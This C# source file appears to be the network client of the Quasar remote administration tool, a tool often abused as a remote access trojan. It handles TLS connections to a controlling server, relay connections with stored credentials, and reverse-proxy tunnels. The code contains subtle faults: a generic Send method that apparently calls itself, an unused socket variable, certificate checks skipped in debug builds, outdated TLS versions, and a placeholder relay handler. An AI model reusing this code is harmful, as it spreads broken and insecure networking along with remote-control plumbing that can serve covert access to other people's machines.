using Quasar.Client.ReverseProxy;
using Quasar.Common.Extensions;
using Quasar.Common.Messages;
using Quasar.Common.Messages.ReverseProxy;
using Quasar.Common.Networking;
using Quasar.Common.Relay.Models;
using Quasar.Common.Relay.Security;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Threading.Tasks;

namespace Quasar.Client.Networking
{
    public class Client : ISender
    {
        /// <summary>
        /// Sends a message to the server
        /// </summary>
        /// <typeparam name="T">The type of the message</typeparam>
        /// <param name="message">The message to send</param>
        public void Send<T>(T message) where T : IMessage
        {
            if (Connected)
            {
                try
                {
                    Send(message);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("Error sending message: " + ex.Message);
                }
            }
        }
        
        /// <summary>
        /// Sends a message to the connected server.
        /// </summary>
        /// <param name="message">The message to send.</param>
        /// <returns>True if successful, false otherwise.</returns>
        protected bool SendMessage(IMessage message)
        {
            return Send(message);
        }
        /// <summary>
        /// The relay client connection for handling relay-based connections
        /// </summary>
        private RelayClientConnection _relayConnection;
        
        /// <summary>
        /// Secure storage for relay credentials
        /// </summary>
        private readonly SecureCredentialStorage _credentialStorage;
        /// <summary>
        /// Occurs as a result of an unrecoverable issue with the client.
        /// </summary>
        public event ClientFailEventHandler ClientFail;

        /// <summary>
        /// Represents a method that will handle failure of the client.
        /// </summary>
        /// <param name="s">The client that has failed.</param>
        /// <param name="ex">The exception containing information about the cause of the client's failure.</param>
        public delegate void ClientFailEventHandler(Client s, Exception ex);

        /// <summary>
        /// Fires an event that informs subscribers that the client has failed.
        /// </summary>
        /// <param name="ex">The exception containing information about the cause of the client's failure.</param>
        private void OnClientFail(Exception ex)
        {
            var handler = ClientFail;
            handler?.Invoke(this, ex);
        }

        /// <summary>
        /// Occurs when the state of the client has changed.
        /// </summary>
        public event ClientStateEventHandler ClientState;

        /// <summary>
        /// Represents the method that will handle a change in the client's state
        /// </summary>
        /// <param name="s">The client which changed its state.</param>
        /// <param name="connected">The new connection state of the client.</param>
        public delegate void ClientStateEventHandler(Client s, bool connected);

        /// <summary>
        /// Fires an event that informs subscribers that the state of the client has changed.
        /// </summary>
        /// <param name="connected">The new connection state of the client.</param>
        private void OnClientState(bool connected)
        {
            if (Connected == connected) return;

            Connected = connected;

            var handler = ClientState;
            handler?.Invoke(this, connected);
        }

        /// <summary>
        /// Occurs when a message is received from the server.
        /// </summary>
        public event ClientReadEventHandler ClientRead;

        /// <summary>
        /// Represents a method that will handle a message from the server.
        /// </summary>
        /// <param name="s">The client that has received the message.</param>
        /// <param name="message">The message that has been received by the server.</param>
        /// <param name="messageLength">The length of the message.</param>
        public delegate void ClientReadEventHandler(Client s, IMessage message, int messageLength);

        /// <summary>
        /// Fires an event that informs subscribers that a message has been received by the server.
        /// </summary>
        /// <param name="message">The message that has been received by the server.</param>
        /// <param name="messageLength">The length of the message.</param>
        private void OnClientRead(IMessage message, int messageLength)
        {
            var handler = ClientRead;
            handler?.Invoke(this, message, messageLength);
        }

        /// <summary>
        /// Occurs when a message is sent by the client.
        /// </summary>
        public event ClientWriteEventHandler ClientWrite;

        /// <summary>
        /// Represents the method that will handle the sent message.
        /// </summary>
        /// <param name="s">The client that has sent the message.</param>
        /// <param name="message">The message that has been sent by the client.</param>
        /// <param name="messageLength">The length of the message.</param>
        public delegate void ClientWriteEventHandler(Client s, IMessage message, int messageLength);

        /// <summary>
        /// Fires an event that informs subscribers that the client has sent a message.
        /// </summary>
        /// <param name="message">The message that has been sent by the client.</param>
        /// <param name="messageLength">The length of the message.</param>
        private void OnClientWrite(IMessage message, int messageLength)
        {
            var handler = ClientWrite;
            handler?.Invoke(this, message, messageLength);
        }

        /// <summary>
        /// The type of the message received.
        /// </summary>
        public enum ReceiveType
        {
            Header,
            Payload
        }

        /// <summary>
        /// The buffer size for receiving data in bytes.
        /// </summary>
        public int BUFFER_SIZE { get { return 1024 * 16; } } // 16KB

        /// <summary>
        /// The keep-alive time in ms.
        /// </summary>
        public uint KEEP_ALIVE_TIME { get { return 25000; } } // 25s

        /// <summary>
        /// The keep-alive interval in ms.
        /// </summary>
        public uint KEEP_ALIVE_INTERVAL { get { return 25000; } } // 25s

        /// <summary>
        /// The header size in bytes.
        /// </summary>
        public int HEADER_SIZE { get { return 4; } } // 4B

        /// <summary>
        /// The maximum size of a message in bytes.
        /// </summary>
        public int MAX_MESSAGE_SIZE { get { return (1024 * 1024) * 5; } } // 5MB

        /// <summary>
        /// Returns an array containing all of the proxy clients of this client.
        /// </summary>
        public ReverseProxyClient[] ProxyClients
        {
            get
            {
                lock (_proxyClientsLock)
                {
                    return _proxyClients.ToArray();
                }
            }
        }

        /// <summary>
        /// Gets if the client is currently connected to a server.
        /// </summary>
        public bool Connected { get; private set; }

        /// <summary>
        /// The stream used for communication.
        /// </summary>
        private SslStream _stream;

        /// <summary>
        /// The server certificate.
        /// </summary>
        private readonly X509Certificate2 _serverCertificate;
        
        /// <summary>
        /// Gets whether the client is using relay mode for connections
        /// </summary>
        public bool RelayModeEnabled => _relayConnection != null && _relayConnection.IsConnected;
        
        /// <summary>
        /// Gets the device ID used for relay connections
        /// </summary>
        public string RelayDeviceId => _relayConnection?.DeviceId;

        /// <summary>
        /// A list of all the connected proxy clients that this client holds.
        /// </summary>
        private List<ReverseProxyClient> _proxyClients = new List<ReverseProxyClient>();

        /// <summary>
        /// Lock object for the list of proxy clients.
        /// </summary>
        private readonly object _proxyClientsLock = new object();

        /// <summary>
        /// The buffer for incoming messages.
        /// </summary>
        private byte[] _readBuffer;

        /// <summary>
        /// The buffer for the client's incoming payload.
        /// </summary>
        private byte[] _payloadBuffer;

        /// <summary>
        /// The queue which holds messages to send.
        /// </summary>
        private readonly Queue<IMessage> _sendBuffers = new Queue<IMessage>();

        /// <summary>
        /// Determines if the client is currently sending messages.
        /// </summary>
        private bool _sendingMessages;

        /// <summary>
        /// Lock object for the sending messages boolean.
        /// </summary>
        private readonly object _sendingMessagesLock = new object();

        /// <summary>
        /// The queue which holds buffers to read.
        /// </summary>
        private readonly Queue<byte[]> _readBuffers = new Queue<byte[]>();

        /// <summary>
        /// Determines if the client is currently reading messages.
        /// </summary>
        private bool _readingMessages;

        /// <summary>
        /// Lock object for the reading messages boolean.
        /// </summary>
        private readonly object _readingMessagesLock = new object();

        // Receive info
        private int _readOffset;
        private int _writeOffset;
        private int _readableDataLen;
        private int _payloadLen;
        private ReceiveType _receiveState = ReceiveType.Header;

        /// <summary>
        /// The mutex prevents multiple simultaneous write operations on the <see cref="_stream"/>.
        /// </summary>
        private readonly Mutex _singleWriteMutex = new Mutex();
        
        /// <summary>
        /// Buffer for reading data from the stream.
        /// </summary>
        private byte[] _tcpReadBuffer;
        
        /// <summary>
        /// Buffer for storing and processing payload data.
        /// </summary>
        private byte[] _tcpPayloadBuffer;
        
        /// <summary>
        /// Constructor of the client, initializes serializer types.
        /// </summary>
        /// <param name="serverCertificate">The server certificate.</param>
        public Client(X509Certificate2 serverCertificate)
        {
            _serverCertificate = serverCertificate;
            _readBuffer = new byte[BUFFER_SIZE];
            TypeRegistry.AddTypesToSerializer(typeof(IMessage), TypeRegistry.GetPacketTypes(typeof(IMessage)).ToArray());
            
            // Initialize secure credential storage
            _credentialStorage = new SecureCredentialStorage();
            
            // Initialize relay client connection
            _relayConnection = new RelayClientConnection(this);
            _relayConnection.ConnectionStateChanged += OnRelayConnectionStateChanged;
            _relayConnection.MessageReceived += OnRelayMessageReceived;
            _relayConnection.SecurityEvent += OnRelaySecurityEvent;
        }
        
        /// <summary>
        /// Handles security events from the relay connection
        /// </summary>
        /// <param name="sender">The sender</param>
        /// <param name="securityMessage">The security message</param>
        private void OnRelaySecurityEvent(object sender, string securityMessage)
        {
            Debug.WriteLine($"Relay security event: {securityMessage}");
            // Could notify user or log to a security log in the future
        }
        
        /// <summary>
        /// Attempts to connect to the specified ip address on the specified port.
        /// </summary>
        /// <param name="ip">The ip address to connect to.</param>
        /// <param name="port">The port of the host.</param>
        /// <param name="useRelay">Whether to use relay mode for connection. Default is true.</param>
        /// <param name="relayServerUrl">The relay server URL when using relay mode.</param>
        /// <param name="fallbackToDirect">Whether to fall back to direct connection if relay fails.</param>
        public void Connect(string ip, ushort port, bool useRelay = true, string relayServerUrl = null, bool fallbackToDirect = true)
        {
            Socket handle = null;
            try
            {
                if (Connected) Disconnect();
                
                // Priority order: 1. Relay (if enabled), 2. Direct connection (if fallback enabled)
                if (useRelay)
                {
                    // Check for stored credentials first
                    if (string.IsNullOrEmpty(relayServerUrl) && _credentialStorage.CredentialsExist())
                    {
                        // Try to retrieve stored credentials
                        var storedCredentials = _credentialStorage.RetrieveCredentials();
                        if (storedCredentials != null && !string.IsNullOrEmpty(storedCredentials.RelayServerUrl))
                        {
                            // Use stored relay server URL
                            relayServerUrl = storedCredentials.RelayServerUrl;
                            Debug.WriteLine("Using stored relay server URL from secure credential storage");
                        }
                    }
                    
                    if (!string.IsNullOrEmpty(relayServerUrl))
                    {
                        // Initialize and connect using relay mode
                        ConnectViaRelay(relayServerUrl, ip);
                        return;
                    }
                    else if (!fallbackToDirect)
                    {
                        // Relay was requested but no URL provided and fallback disabled
                        OnClientFail(new Exception("Relay connection requested but no relay server URL provided"));
                        return;
                    }
                    // If no relay URL but fallback enabled, continue to direct connection
                }
                
                // Direct connection
                var sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                sock.SetKeepAliveEx(KEEP_ALIVE_INTERVAL, KEEP_ALIVE_TIME);
                sock.Connect(ip, port);

                if (!sock.Connected)
                {
                    sock.Dispose();
                    OnClientFail(new Exception("Failed to connect"));
                    return;
                }

                SslStream stream = new SslStream(new NetworkStream(sock, true), false, ValidateServerCertificate);
                stream.AuthenticateAsClient(ip, null, SslProtocols.Tls | SslProtocols.Tls11 | SslProtocols.Tls12, false);

                _stream = stream;

                OnClientState(true);
                
                try
                {
                    _stream.BeginRead(_readBuffer, 0, _readBuffer.Length, AsyncReceive, null);
                }
                catch (Exception ex)
                {
                    OnClientFail(ex);
                }
            }
            catch (Exception ex)
            {
                if (handle != null)
                {
                    handle.Dispose();
                }
                OnClientFail(ex);
            }
        }
        
        /// <summary>
        /// Connect to a server using the relay network
        /// </summary>
        /// <param name="relayServerUrl">The relay server URL</param>
        /// <param name="serverId">The server ID to connect to</param>
        private async void ConnectViaRelay(string relayServerUrl, string serverId)
        {
            try
            {
                // Notify of connection attempt
                OnClientState(true);
                
                // Try to retrieve stored credentials for this server/relay
                string password = null;
                if (_credentialStorage.CredentialsExist())
                {
                    var storedCredentials = _credentialStorage.RetrieveCredentials();
                    if (storedCredentials != null && 
                        storedCredentials.RelayServerUrl == relayServerUrl && 
                        !string.IsNullOrEmpty(storedCredentials.Password))
                    {
                        // Use stored password
                        password = storedCredentials.Password;
                        Debug.WriteLine("Using stored credentials for secure relay connection");
                    }
                }
                
                // Connect with retrieved password if available
                bool connected = await _relayConnection.ConnectAsync(relayServerUrl, serverId, password);
                
                if (!connected)
                {
                    OnClientFail(new Exception("Failed to connect via relay"));
                }
                else
                {
                    // Store or update credentials after successful connection
                    StoreRelayCredentials(relayServerUrl, _relayConnection.DeviceId, password);
                    
                    OnClientState(connected);
                }
            }
            catch (Exception ex)
            {
                OnClientFail(ex);
            }
        }
        
        /// <summary>
        /// Stores relay credentials securely for future connections
        /// </summary>
        /// <param name="relayServerUrl">The relay server URL</param>
        /// <param name="deviceId">The device ID</param>
        /// <param name="password">The password (optional)</param>
        private void StoreRelayCredentials(string relayServerUrl, string deviceId, string password = null)
        {
            try
            {
                var credentials = new RelayCredentials(relayServerUrl, deviceId, password);
                _credentialStorage.StoreCredentials(credentials);
                Debug.WriteLine("Relay credentials stored securely");
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to store relay credentials: {ex.Message}");
            }
        }
        
        /// <summary>
        /// Validates the server certificate for secure connections.
        /// </summary>
        /// <returns>Returns <value>true</value> when the validation was successful, otherwise <value>false</value>.</returns>
        private bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            // for debugging don't validate server certificate
            return true;
#else
            var serverCsp = (RSACryptoServiceProvider)_serverCertificate.PublicKey.Key;
            var connectedCsp = (RSACryptoServiceProvider)new X509Certificate2(certificate).PublicKey.Key;
            // compare the received server certificate with the included server certificate to validate we are connected to the correct server
            return _serverCertificate.Equals(certificate);
#endif
        }

        /// <summary>
        /// Handles messages received through the relay connection
        /// </summary>
        /// <param name="sender">The sender</param>
        /// <param name="isConnected">Whether the relay connection is connected</param>
        private void OnRelayConnectionStateChanged(object sender, bool isConnected)
        {
            OnClientState(isConnected);
        }
        
        /// <summary>
        /// Handles messages received through the relay connection
        /// </summary>
        /// <param name="sender">The sender</param>
        /// <param name="message">The received message</param>
        private void OnRelayMessageReceived(object sender, IMessage message)
        {
            // Process the received message as a normal client message
            if (message != null)
            {
                // In a full implementation, this would process the message properly
                // For now, we'll just notify listeners that a message was received
                OnClientRead(message, 0);
            }
        }
        
        /// <summary>
        /// Disconnect the client from the server, disconnect all proxies that
        /// are held by this client, and dispose of other resources associated
        /// with this client.
        /// </summary>
        public void Disconnect()
        {
            // Disconnect the relay connection if active
            if (_relayConnection != null)
            {
                _relayConnection.Disconnect();
            }
            
            if (_stream != null)
            {
                _stream.Close();
                _readOffset = 0;
                _writeOffset = 0;
                _readableDataLen = 0;
                _payloadLen = 0;
                _payloadBuffer = null;
                _receiveState = ReceiveType.Header;
                //_singleWriteMutex.Dispose(); TODO: fix socket re-use by creating new client on disconnect

                if (_proxyClients != null)
                {
                    lock (_proxyClientsLock)
                    {
                        try
                        {
                            foreach (ReverseProxyClient proxy in _proxyClients)
                                proxy.Disconnect();
                        }
                        catch (Exception)
                        {
                        }
                    }
                }
            }

            OnClientState(false);
        }

        public void ConnectReverseProxy(ReverseProxyConnect command)
        {
            lock (_proxyClientsLock)
            {
                _proxyClients.Add(new ReverseProxyClient(command, this));
            }
        }

        public ReverseProxyClient GetReverseProxyByConnectionId(int connectionId)
        {
            lock (_proxyClientsLock)
            {
                return _proxyClients.FirstOrDefault(t => t.ConnectionId == connectionId);
            }
        }

        public void RemoveProxyClient(int connectionId)
        {
            try
            {
                lock (_proxyClientsLock)
                {
                    for (int i = 0; i < _proxyClients.Count; i++)
                    {
                        if (_proxyClients[i].ConnectionId == connectionId)
                        {
                            _proxyClients.RemoveAt(i);
                            break;
                        }
                    }
                }
            }
            catch { }
        }
        
        /// <summary>
        /// Sends a message through the relay channel if using relay mode, otherwise
        /// sends it through the direct SSL connection.
        /// </summary>
        /// <param name="message">The message to be sent.</param>
        public bool Send(IMessage message)
        {
            if (message == null) return false;
            
            try
            {
                // If using relay connection, send through it
                if (RelayModeEnabled)
                {
                    return _relayConnection.SendMessage(message);
                }
                
                // Otherwise send through the direct SSL connection
                _singleWriteMutex.WaitOne();
                try
                {
                    if (_stream != null)
                    {
                        var payload = message.Serialize();
                        var headerLen = BitConverter.GetBytes(payload.Length);
                        _stream.Write(headerLen, 0, headerLen.Length);
                        _stream.Write(payload, 0, payload.Length);
                        _stream.Flush();
                        OnClientWrite(message, payload.Length);
                        return true;
                    }
                }
                finally
                {
                    _singleWriteMutex.ReleaseMutex();
                }
            }
            catch (Exception)
            {
                Disconnect();
            }
            return false;
        }
        
        /// <summary>
        /// Receive data asynchronously.  The 'BeginRead' method calls this method to process
        /// data that has been received from the server.
        /// </summary>
        /// <param name="ar">An async result.</param>
        private void AsyncReceive(IAsyncResult ar)
        {
            try
            {
                if (_stream == null) return;  // Connection closed

                var count = _stream.EndRead(ar);

                if (count <= 0)
                {
                    Disconnect();
                    return;
                }

                lock (_readingMessagesLock)
                {
                    _readableDataLen += count;
                    ProcessRead();
                }

                if (_stream != null)
                    _stream.BeginRead(_readBuffer, _writeOffset, BUFFER_SIZE - _writeOffset, AsyncReceive, null);
            }
            catch (ObjectDisposedException) { }
            catch (NullReferenceException) { }
            catch (Exception ex)
            {
                Debug.WriteLine("Error in AsyncReceive: " + ex.Message);
                Disconnect();
            }
        }

        /// <summary>
        /// Processes the data received from the server.
        /// </summary>
        private void ProcessRead()
        {
            while (_readableDataLen > 0)
            {
                if (_receiveState == ReceiveType.Header)
                {
                    if (_readableDataLen >= HEADER_SIZE)
                    {
                        // Read header
                        _payloadLen = BitConverter.ToInt32(_readBuffer, _readOffset);
                        _readOffset += HEADER_SIZE;
                        _readableDataLen -= HEADER_SIZE;

                        // Check if payload length is valid
                        if (_payloadLen <= 0 || _payloadLen > MAX_MESSAGE_SIZE)
                        {
                            Disconnect();
                            return;
                        }

                        _receiveState = ReceiveType.Payload;
                        _payloadBuffer = new byte[_payloadLen];
                    }
                    else break; // Not enough data available, exit while loop
                }
                
                if (_receiveState == ReceiveType.Payload)
                {
                    // Read payload
                    var length = (_payloadLen > _readableDataLen) ? _readableDataLen : _payloadLen;

                    try
                    {
                        // Copy data from read buffer to payload buffer
                        Buffer.BlockCopy(_readBuffer, _readOffset, _payloadBuffer, 0, length);
                    }
                    catch (Exception)
                    {
                        Disconnect();
                        return;
                    }

                    _readOffset += length;
                    _readableDataLen -= length;
                    _payloadLen -= length;

                    if (_payloadLen == 0) // Payload fully received
                    {
                        // Handle message
                        IMessage message = null;
                        try
                        {
                            // Deserialize payload
                            message = MessageSerializer.Deserialize(_payloadBuffer);
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine("Error deserializing message: " + ex.Message);
                        }

                        if (message != null)
                            OnClientRead(message, _payloadBuffer.Length);

                        _receiveState = ReceiveType.Header;
                    }
                }

                // Check if we need to resize the receive buffer
                if (_readOffset >= BUFFER_SIZE / 2)
                {
                    // Create a new buffer if needed and copy the remaining data to the beginning
                    if (_readableDataLen > 0)
                        Buffer.BlockCopy(_readBuffer, _readOffset, _readBuffer, 0, _readableDataLen);

                    _writeOffset = _readableDataLen;
                    _readOffset = 0;
                }
            }
        }
    }
}
